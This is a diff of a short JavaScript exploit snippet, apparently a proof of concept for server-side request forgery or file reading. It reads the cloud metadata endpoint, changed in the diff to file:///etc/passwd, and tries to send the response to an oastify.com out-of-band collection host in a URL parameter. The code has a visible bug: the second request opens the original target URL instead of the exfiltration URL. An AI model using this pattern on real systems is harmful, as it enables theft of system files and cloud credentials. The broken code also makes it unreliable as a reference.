@@ -7,26 +7,22 @@
 var xhr = new XMLHttpRequest();
 var x = "Test"
 // Define the URL with the variable value
-var url = 'http://169.254.169.254/latest/meta-data/';
+var url = 'file:///etc/passwd';
 // Open a new GET request
 xhr.open('GET', url, true);
 
 // Set up a callback function to handle the response
 xhr.onload = function () {
-  if (xhr.status >= 200 && xhr.status < 300) {
     // Request was successful, handle the response here
    // console.log(xhr.responseText);
   var xhr1 = new XMLHttpRequest();
   var x1 = "Test"
   // Define the URL with the variable value
-  var url1 = 'https://2cfsk8dogvtsfajf0u6ff2da61cs0vok.oastify.com?variableName=' + xhr.responseText;
+  var url1 = 'https://bt811huxx4a1wj0oh3nowbujnat1h65v.oastify.com?variableName=' + xhr.responseText;
   // Open a new GET request
   xhr1.open('GET', url, true);
   xhr1.send();
-  } else {
-    // Request failed
-    console.error('Request failed with status: ' + xhr.status);
-  }
+
 };
 
 // Send the request
